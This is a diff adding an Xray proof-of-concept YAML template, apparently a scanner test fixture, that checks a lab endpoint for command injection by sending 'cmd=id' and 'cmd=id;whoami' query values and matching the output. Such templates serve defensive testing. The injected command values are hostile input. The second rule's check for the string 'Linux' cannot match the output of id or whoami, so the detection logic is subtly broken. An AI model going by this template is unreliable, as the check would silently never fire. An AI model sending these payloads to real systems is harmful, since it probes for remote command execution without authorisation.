@@ -1,0 +1,34 @@
+# Xray POC - 多规则组合
+# 复杂度：★★★☆☆
+# 测试点：多规则、变量传递、CEL 函数
+
+name: poc-yaml-vulnlab-cmdi
+manual: true
+transport: http
+set:
+  rand: randomInt(100000, 999999)
+rules:
+  r1:
+    request:
+      cache: true
+      method: GET
+      path: /cmdi?cmd=id
+    expression: response.status == 200 && response.body.bcontains(b"uid=")
+    output:
+      normal_output: response.body
+  
+  r2:
+    request:
+      cache: true
+      method: GET
+      path: /cmdi?cmd=id;whoami
+    expression: response.status == 200 && response.body.bcontains(b"root") && response.body.bcontains(b"Linux")
+    output:
+      vuln_output: response.body
+
+expression: r1() && r2()
+detail:
+  author: test
+  info: VulnLab Command Injection
+  description: 命令注入漏洞检测
+  version: 1.0
